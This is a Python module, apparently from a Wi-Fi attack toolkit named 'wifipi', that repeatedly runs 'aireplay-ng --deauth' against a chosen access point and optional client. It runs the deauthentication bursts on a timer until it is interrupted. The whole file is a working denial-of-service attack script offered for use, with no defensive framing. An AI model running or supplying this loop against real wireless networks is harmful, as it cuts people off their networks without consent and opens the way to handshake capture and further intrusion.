"""Inner loop for attack/deauth-loop.

Invoked as a subprocess:
    python3 -m wifipi.modules.attack._deauth_loop_runner \
        --bssid AA:... --iface wlan1mon --interval 5 --burst 5 [--client DD:...]
"""

from __future__ import annotations

import argparse
import signal
import subprocess
import sys
import time


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--bssid", required=True)
    p.add_argument("--iface", required=True)
    p.add_argument("--client", default=None)
    p.add_argument("--interval", type=int, default=5)
    p.add_argument("--burst", type=int, default=5)
    args = p.parse_args()

    running = {"go": True}

    def stop(_sig, _frm):
        running["go"] = False

    signal.signal(signal.SIGTERM, stop)
    signal.signal(signal.SIGINT, stop)

    argv = ["aireplay-ng", "--deauth", str(args.burst), "-a", args.bssid]
    if args.client:
        argv += ["-c", args.client]
    argv.append(args.iface)

    round_ = 0
    while running["go"]:
        round_ += 1
        print(f"[*] round {round_}: {' '.join(argv)}", flush=True)
        subprocess.run(argv, check=False)
        for _ in range(args.interval):
            if not running["go"]:
                break
            time.sleep(1)
    return 0


if __name__ == "__main__":
    sys.exit(main())
